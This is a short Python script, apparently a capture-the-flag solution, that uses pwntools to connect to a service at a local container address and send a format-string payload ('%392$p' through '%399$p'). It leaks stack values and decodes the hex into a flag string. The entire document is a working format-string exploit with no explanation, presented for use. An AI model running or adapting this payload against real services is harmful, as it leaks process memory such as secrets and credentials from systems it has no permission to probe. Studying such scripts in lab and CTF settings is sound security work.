from pwn import *
from tqdm import tqdm

p = remote('172.17.0.2', 1337)

p.sendline('%392$p %393$p %394$p %395$p %396$p %397$p %398$p %399$p')
ans = p.recvall().split(b'\n')[-2].split(b'>')[1][1:]
flag_bits = ans.decode().split(' ')

for i in flag_bits:
    print(bytes.fromhex(i[2:]).decode()[::-1], end='')
